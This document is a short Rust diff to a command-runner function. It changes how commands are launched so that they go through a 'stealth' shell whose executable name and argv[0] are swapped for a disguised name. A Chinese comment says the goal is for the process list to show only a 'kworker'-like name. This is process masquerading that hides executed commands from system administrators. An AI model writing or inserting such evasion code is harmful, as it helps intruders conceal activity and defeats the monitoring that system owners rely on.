@@ -2,6 +2,7 @@
 
 use std::collections::HashMap;
 use std::io::Read;
+use std::os::unix::process::CommandExt;
 use std::path::Path;
 use std::process::{Child, Command, Stdio};
 use std::sync::atomic::{AtomicU32, Ordering};
@@ -101,8 +102,12 @@ pub fn start(cmd: &str, args: &[String], cwd: &str, env: &[(String, String)]) ->
         line.push_str(&quote(arg));
     }
 
-    let mut command = Command::new(crate::defs::SHELL_PATH);
+    // 用伪装名的 shell：exec 的文件名决定 /proc/pid/comm，argv[0] 决定 cmdline，
+    // 两者一起换掉，进程列表里就只剩一个 kworker 之类的名字。
+    let (shell, argv0) = crate::stealth::stealth_shell();
+    let mut command = Command::new(&shell);
     command
+        .arg0(argv0)
         .arg("-c")
         .arg(&line)
         .current_dir(dir)
